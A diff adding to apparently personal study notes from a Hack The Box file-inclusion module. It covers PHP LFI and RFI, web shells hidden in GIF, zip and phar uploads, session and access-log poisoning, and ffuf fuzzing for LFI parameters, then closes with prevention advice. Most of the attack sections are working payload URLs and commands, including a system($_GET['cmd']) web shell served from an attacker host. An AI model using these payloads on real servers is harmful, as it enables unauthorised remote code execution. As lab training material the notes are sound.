@@ -187,7 +187,8 @@ NolanCarougeHTB@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
 ```
 
 ```
-http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+http://<SERVER_IP>:<PORT>/index.php?
+language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
 
 Or
@@ -216,3 +217,176 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ## Remote File Inclusion (RFI) : 
+
+When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution.
+
+Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+```
+
+However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. A more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content.
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+```
+
+### HTTP : 
+
+The first step in gaining remote code execution is creating a malicious script in the language of the web application.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Now, we can start a server on our machine with a basic python server with the following command, as follows : 
+
+```shell
+NolanCarougeHTB@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+```
+
+Now, we can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. We will also specify the command to be executed with `&cmd=id` :
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+### FTP : 
+
+We can start a basic FTP server with Python's `pyftpdlib`, as follows :
+
+```shell
+NolanCarougeHTB@htb[/htb]$ sudo python -m pyftpdlib -p 21
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+```
+
+```shell
+NolanCarougeHTB@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+```
+
+### SMB : 
+
+We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows :
+
+```shell
+NolanCarougeHTB@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
+```
+
+Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier :
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
+
+## LFI and File Uploads : 
+
+We can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+
+Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file :
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+```shell
+NolanCarougeHTB@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
+## Log Poisoning : 
+
+Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.
+
+Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
+
+```url
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`.
+By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.
+
+We can use Burp Suite to modify User-Agent header to put <?php system($_GET["cmd"]); ?> in the logs and then see the response in the access.log when we put &cmd=.. in the url with a normal User-Agent.
+
+## Automated Scanning :
+
+We can fuzz the page for common `GET` parameters, as follows:
+
+```shell
+NolanCarougeHTB@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+```
+
+Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+
+We may need to know the full server webroot path to complete our exploitation in some cases.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+```
+
+We may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in.
+
+```shell
+NolanCarougeHTB@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+```
+
+Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.
+
+## File Inclusion Prevention : 
+
+The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has `basename()`, which will read the path and only return the filename portion.
+
+Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:
+
+```php
+while(substr_count($input, '../', 0)) {
+    $input = str_replace('../', '', $input);
+};
+```
+
+Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occur. For example, we should globally disable the inclusion of remote files. In PHP this can be done by setting `allow_url_fopen` and `allow_url_include` to Off.
+
+It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files.
